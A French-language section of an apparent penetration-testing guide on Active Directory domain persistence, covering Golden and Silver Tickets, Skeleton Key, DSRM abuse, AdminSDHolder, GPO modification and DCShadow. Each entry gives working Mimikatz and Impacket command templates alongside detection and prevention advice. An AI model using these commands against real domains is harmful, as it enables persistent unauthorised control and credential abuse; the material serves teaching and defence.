# VII.B. Persistance au Niveau du Domaine

La persistance au niveau du domaine est beaucoup plus puissante et permet à un attaquant de maintenir un accès privilégié à l'ensemble du domaine Active Directory, même si des comptes individuels sont réinitialisés ou des machines nettoyées.

## 1. Golden Ticket (Attaque Kerberos)

*   **Description :** Un Golden Ticket est un Ticket Granting Ticket (TGT) Kerberos forgé pour n'importe quel utilisateur (souvent un administrateur inexistant ou un compte hautement privilégié) avec une durée de vie très longue (ex: 10 ans). Il est créé en utilisant le hash NTLM du compte `krbtgt` du domaine.
*   **Prérequis :**
    *   Hash NTLM du compte `krbtgt` du domaine (obtenu via DCSync).
    *   SID du domaine.
    *   Nom de domaine FQDN.
*   **Outils / Commandes :**
    *   **Mimikatz :**
        ```
        # Forger le Golden Ticket et l'injecter (/ptt)
        kerberos::golden /user:<NOM_UTILISATEUR_A_USURPER> /domain:<DOMAINE_FQDN> /sid:<SID_DOMAINE> /krbtgt:<HASH_NTLM_KRBTGT> /id:<ID_UTILISATEUR_A_USURPER_Optionnel> /groups:<GROUP_IDS_Optionnel> /ptt
        # Exemple : Usurper un admin de domaine
        # kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-DOMAINSID /krbtgt:HASH_KRBTGT /id:500 /groups:512,518,519,520 /ptt
        # klist (pour voir le ticket injecté)
        # dir \\dc01.corp.local\C$
        ```
    *   **Impacket (`ticketer.py`) :**
        ```bash
        ticketer.py -nthash <HASH_NTLM_KRBTGT> -domain-sid <SID_DOMAINE> -domain <DOMAINE_FQDN> <NOM_UTILISATEUR_A_USURPER>
        # Exporter le ticket dans une variable d'environnement pour l'utiliser avec d'autres outils Impacket
        # export KRB5CCNAME=/chemin/vers/ticket.ccache
        ```
*   **Impact :** Contrôle total du domaine tant que le hash `krbtgt` n'est pas changé (deux fois).
*   **Détection/Prévention :**
    *   Changer le mot de passe du compte `krbtgt` deux fois (une fois pour invalider les tickets actuels basés sur l'ancien hash, une deuxième fois pour invalider ceux basés sur le hash "précédent"). C'est une opération à fort impact.
    *   Surveiller les anomalies dans les tickets Kerberos (durée de vie excessive, SID de groupe inhabituels, encryption RC4 si AES est la norme).
    *   Microsoft Defender for Identity peut détecter l'utilisation de Golden Tickets.

## 2. Silver Ticket (Attaque Kerberos)

*   **Description :** Un Silver Ticket est un Ticket Granting Service (TGS) Kerberos forgé pour un service spécifique sur une machine spécifique (ex: CIFS sur un serveur de fichiers, HOST sur un DC). Il est créé en utilisant le hash NTLM du compte de service (ou du compte machine si le service tourne sous son contexte).
*   **Prérequis :**
    *   Hash NTLM du compte de service/machine cible.
    *   SID du domaine.
    *   Nom de domaine FQDN.
    *   SPN du service cible.
*   **Outils / Commandes (Mimikatz) :**
    ```
    # Forger un Silver Ticket pour le service CIFS sur SRV01 et l'injecter
    kerberos::golden /user:<UTILISATEUR_A_USURPER> /domain:<DOMAINE_FQDN> /sid:<SID_DOMAINE> /target:SRV01.corp.local /service:CIFS /rc4:<HASH_NTLM_COMPTE_MACHINE_SRV01> /ptt
    # dir \\SRV01.corp.local\C$
    ```
*   **Impact :** Accès au service spécifique sur la machine cible avec les privilèges de l'utilisateur usurpé. Moins bruyant qu'un Golden Ticket.
*   **Détection/Prévention :**
    *   Mots de passe forts pour les comptes de service et les comptes machines.
    *   Surveiller les anomalies dans les TGS.

## 3. Skeleton Key

*   **Description :** Un malware injecté dans le processus LSASS sur tous les Contrôleurs de Domaine. Il permet à l'attaquant de s'authentifier avec n'importe quel compte du domaine en utilisant un mot de passe "maître" (la Skeleton Key), tout en permettant aux utilisateurs légitimes de s'authentifier avec leurs mots de passe normaux.
*   **Prérequis :** Droits d'admin de domaine pour déployer le malware sur tous les DCs.
*   **Outils :** Mimikatz (`misc::skeleton`).
    ```
    # Sur un DC (nécessite des droits SYSTEM)
    privilege::debug
    misc::skeleton
    # L'attaquant peut ensuite s'authentifier avec n'importe quel compte en utilisant le mot de passe "mimikatz" (par défaut)
    ```
*   **Impact :** Accès complet à tous les comptes du domaine.
*   **Détection/Prévention :**
    *   Protection LSA (RunAsPPL) pour empêcher l'injection dans LSASS.
    *   EDRs avancés.
    *   Redémarrer les DCs peut supprimer la Skeleton Key de la mémoire (mais l'attaquant peut la réinjecter s'il a toujours accès).

## 4. Abus du Compte DSRM (Directory Services Restore Mode)

*   **Description :** Le compte DSRM est un compte administrateur local sur les DCs, utilisé pour restaurer Active Directory. Si son hash NTLM est connu ou synchronisé avec un compte de domaine (via une GPO cachée ou une modification de registre), il peut être utilisé pour un accès persistant aux DCs.
*   **Technique "Pass-the-Hash" avec DSRM :**
    1.  Obtenir le hash NTLM du compte DSRM (depuis la SAM locale du DC).
    2.  Modifier une clé de registre sur le DC pour permettre l'utilisation du compte DSRM pour des connexions réseau normales :
        `HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior` (valeur `2`).
    3.  Utiliser PtH avec le hash DSRM pour accéder au DC.
*   **Outils :** Mimikatz (`lsadump::sam`, `sekurlsa::pth`).
*   **Détection/Prévention :**
    *   Surveiller les modifications de la clé `DsrmAdminLogonBehavior`.
    *   S'assurer que le mot de passe DSRM est unique, complexe et régulièrement changé. Ne pas le synchroniser avec des comptes de domaine.

## 5. AdminSDHolder et Propagation des Permissions

*   **Description :** L'objet `AdminSDHolder` (dans `CN=AdminSDHolder,CN=System,<BaseDN_Domaine>`) a un descripteur de sécurité qui est copié toutes les heures (par défaut) sur tous les comptes et groupes "protégés" (membres de groupes administratifs comme Admins du Domaine, Opérateurs de Comptes, etc.). Un attaquant avec les droits de modifier `AdminSDHolder` peut s'accorder des permissions persistantes sur tous les comptes admin.
*   **Technique :**
    1.  Ajouter un ACE (Access Control Entry) pour un compte contrôlé par l'attaquant à la DACL de `AdminSDHolder`, lui donnant `GenericAll` ou des droits de réinitialisation de mot de passe.
    2.  Attendre que le processus SDProp (Security Descriptor Propagator) propage ces permissions.
*   **Outils :** PowerView (`Add-ObjectAcl`), Active Directory Users and Computers (avec "Advanced Features" activé).
*   **Détection/Prévention :**
    *   Surveiller les modifications de la DACL de `AdminSDHolder`.
    *   Auditer régulièrement les permissions sur les comptes protégés.

## 6. Modification de Politiques de Groupe (GPO)

*   **Description :** Si un attaquant a des droits de modification sur une GPO liée à une OU contenant des utilisateurs/ordinateurs intéressants (ou à la racine du domaine), il peut l'utiliser pour la persistance.
*   **Exemples :**
    *   Créer une tâche planifiée qui exécute un payload.
    *   Ajouter un utilisateur aux administrateurs locaux.
    *   Déployer un logiciel (payload).
    *   Modifier les scripts de démarrage/connexion.
*   **Détection/Prévention :**
    *   Surveiller les modifications des GPOs (Event ID 5136, 5137, 5141).
    *   Limiter les droits de modification des GPOs.
    *   Auditer régulièrement le contenu des GPOs.

## 7. DCShadow

*   **Description :** Permet à un attaquant avec les droits nécessaires (souvent obtenus via compromission d'un admin de domaine ou d'un compte machine de DC) d'enregistrer un faux DC. Ce faux DC peut ensuite pousser des modifications malveillantes dans AD (ex: modifier des objets, des schémas) qui seront répliquées.
*   **Outils :** Mimikatz (`lsadump::dcshadow`).
*   **Impact :** Peut être utilisé pour créer des backdoors discrètes, modifier des permissions, etc.
*   **Détection/Prévention :**
    *   Surveiller l'enregistrement de nouveaux DCs.
    *   Microsoft Defender for Identity.
    *   Limiter les droits permettant d'enregistrer des DCs.

Ces techniques de persistance au niveau du domaine sont critiques à détecter et à prévenir car elles donnent à l'attaquant un contrôle durable et étendu. 